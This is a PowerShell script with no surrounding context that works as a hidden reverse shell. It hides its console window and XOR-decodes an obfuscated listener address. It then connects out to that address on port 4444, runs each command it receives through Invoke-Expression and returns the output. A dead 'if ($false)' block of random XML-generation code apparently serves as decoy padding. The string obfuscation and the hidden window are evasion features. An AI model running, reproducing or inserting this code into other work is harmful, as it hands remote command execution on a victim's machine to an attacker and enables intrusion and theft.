Add-Type -Name Win -Namespace Console -MemberDefinition @"
  [DllImport("user32.dll")]
  public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
  [DllImport("kernel32.dll")]
  public static extern IntPtr GetConsoleWindow();
"@

$consolePtr = [Console.Win]::GetConsoleWindow()
[Console.Win]::ShowWindowAsync($consolePtr, 0)
$LHOST = $($k4814='YN:,Phk7';$b=[byte[]](0x68,0x77,0x08,0x02,0x61,0x5E,0x53,0x19,0x68,0x60,0x08,0x1E,0x64);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4814);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})); $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(($Output + $($k8745='YMXmQq-L=lhE';$b=[byte[]](0x39,0x23);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8745);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
if ($false) {
    $xmlDoc = [xml]::new(); $rootElement = $xmlDoc.CreateElement("Config"); $childElement = $xmlDoc.CreateElement("Setting"); $childElement.InnerText = (Get-Random); $rootElement.AppendChild($childElement) | Out-Null; $xmlDoc.AppendChild($rootElement) | Out-Null; Write-Verbose "Generated XML fragment: $($xmlDoc.OuterXml)"
}
